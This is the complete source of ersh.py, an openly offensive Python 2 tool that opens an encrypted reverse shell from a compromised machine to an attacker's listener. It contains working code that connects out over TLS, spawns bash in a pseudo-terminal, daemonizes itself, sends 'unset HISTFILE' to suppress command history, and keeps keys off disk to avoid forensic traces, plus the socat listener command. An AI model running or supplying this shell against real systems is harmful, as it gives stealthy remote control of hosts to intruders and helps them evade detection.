#!/usr/bin/python
"""
ersh.py by @JusticeRage

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

###############################################################################
# Reverse listener command:
# socat openssl-listen:443,reuseaddr,cert=server.pem,cafile=client.crt,method=TLS1 file:`tty`,raw,echo=0
###############################################################################

###############################################################################
# EDIT THE PARAMETERS BELOW THIS LINE
###############################################################################

HOST = "127.0.0.1"
PORT = 443
SHELL = ["/bin/bash", "--noprofile"]
FIRST_COMMAND = "unset HISTFILE"

# openssl genrsa -out client.key 2048
client_key = """-----BEGIN PRIVATE KEY-----
[Edit me!]
-----END PRIVATE KEY-----"""

# openssl req -new -key client.key -x509 -days 50 -out client.crt
client_crt = """-----BEGIN CERTIFICATE-----
[Edit me!]
-----END CERTIFICATE-----"""

# openssl genrsa -out server.key 2048
# openssl req -new -key server.key -x509 -days 50 -out server.crt
server_crt = """-----BEGIN CERTIFICATE-----
[Edit me!]
-----END CERTIFICATE-----"""

###############################################################################
# EDIT THE PARAMETERS ABOVE THIS LINE
###############################################################################

import os
import pty
import select
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time

# -----------------------------------------------------------------------------

GREEN = '\033[92m'
RED = '\033[91m'
END = '\033[0m'

def red(text): return RED + text + END
def green(text): return GREEN + text + END
def error(text): return "[" + red("!") + "] " + red("Error: " + text)
def success(text): return "[" + green("*") + "] " + green(text)

# -----------------------------------------------------------------------------

class PipeThread(threading.Thread):
    """
    This thread is a dirty hack to circumvent the SSL module's reliance on
    files. The whole named pipe gymnastic is implemented to prevent writing
    the key and certificates to the disk.
    Named pipe contents are not backed to the hard drive but reside in memory.
    """
    def __init__(self, c_key_filename, c_crt_filename, s_crt_filename):
        super(PipeThread, self).__init__()
        self.c_key_filename = c_key_filename
        self.c_crt_filename = c_crt_filename
        self.s_crt_filename = s_crt_filename
        self.ready = False

    def run(self):
        os.mkfifo(self.c_key_filename)
        os.mkfifo(self.c_crt_filename)
        os.mkfifo(self.s_crt_filename)
        self.ready = True
        with open(self.c_key_filename, "w") as pipe:
            pipe.write(client_key)
        with open(self.c_crt_filename, "w") as pipe:
            pipe.write(client_crt)
        with open(self.s_crt_filename, "w") as pipe:
            pipe.write(server_crt)
        return

# -----------------------------------------------------------------------------

def establish_connection():
    """
    This function establishes an SSL connection to the remote host.
    :return: A connected socket if the connection attempt was successful, or None.
    """
    c_key = tempfile.mktemp()
    c_crt = tempfile.mktemp()
    s_crt = tempfile.mktemp()
    t = PipeThread(c_key, c_crt, s_crt)
    t.setDaemon(True)
    t.start()
    while not t.ready:
        time.sleep(0.2)  # Make sure the thread has had time to create the pipes.
    try:
        s = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), ssl_version=ssl.PROTOCOL_TLSv1,
                            keyfile=c_key,
                            certfile=c_crt,
                            ca_certs=s_crt)
        s.connect((HOST, PORT))
        return s
    except Exception as e:
        print error("Could not connect to %s:%d!%s (%s)" % (HOST, PORT, END, e))
        return None
    finally:
        os.unlink(c_key)
        os.unlink(c_crt)
        os.unlink(s_crt)

# -----------------------------------------------------------------------------

def daemonize():
    def fork():
        try:
            pid = os.fork()
            if pid > 0:
                # Exit parent
                sys.exit(0)
        except OSError as e:
            print error("Error while forking! (%s)" % e.message)
            sys.exit(1)

    # Double fork to daemonize
    fork()
    os.setsid()
    os.umask(0)
    fork()

###############################################################################
# Main
###############################################################################

def main():
    s = establish_connection()
    if s is None:
        return -1
    print success("Connection established!")
    daemonize()

    master, slave = pty.openpty()
    bash = subprocess.Popen(SHELL,
                            preexec_fn=os.setsid,
                            stdin=slave,
                            stdout=slave,
                            stderr=slave,
                            universal_newlines=True)
    time.sleep(1)  # Wait for bash to start before sending data to it.
    os.write(master, "%s\n" % FIRST_COMMAND)

    try:
        while bash.poll() is None:
            r, w, e = select.select([s, master], [], [])

            # SSLSockets don't play nice with select because they buffer data internally.
            # Code taken from https://stackoverflow.com/questions/3187565/select-and-ssl-in-python.
            if s in r:
                try:
                    data = s.recv(1024)
                except ssl.SSLError as e:
                    if e.errno == ssl.SSL_ERROR_WANT_READ:
                        continue
                    raise
                if not data:  # End of file.
                    break
                data_left = s.pending()
                while data_left:
                    data += s.recv(data_left)
                    data_left = s.pending()
                os.write(master, data)
            elif master in r:
                s.write(os.read(master, 2048))
    finally:
        s.close()

if __name__ == "__main__":
    main()
